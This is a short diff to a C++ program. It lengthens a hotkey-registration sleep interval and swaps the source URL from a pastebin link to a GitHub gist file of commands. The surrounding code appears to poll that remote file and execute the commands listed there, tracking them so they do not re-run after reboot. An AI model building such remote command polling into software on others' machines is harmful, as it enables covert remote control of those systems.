@@ -95,7 +95,7 @@ void hotkeyChanger()
             logCommand("Failed to register hotkey", false);
         }
 
-        std::this_thread::sleep_for(std::chrono::seconds(5));
+        std::this_thread::sleep_for(std::chrono::seconds(30));
     }
 }
 std::string getStateFilePath()
@@ -555,7 +555,7 @@ int main(int argc, char* argv[]) {
         // This prevents old commands from re-executing after reboot
         loadExecutedCommands();
         
-        std::string commandsUrl = "https://pastebin.com/raw/VqqdCTes";
+        std::string commandsUrl = "https://gist.githubusercontent.com/SURYA-PRAKASH-J/b30ba9965a19e6c107f3180c60319900/raw/3f2cb286a42b491172a5dbf9742971202ca334cb/cmds.txt";
         int pollInterval = 5;
        
         logCommand("Starting with URL: " + commandsUrl, true);
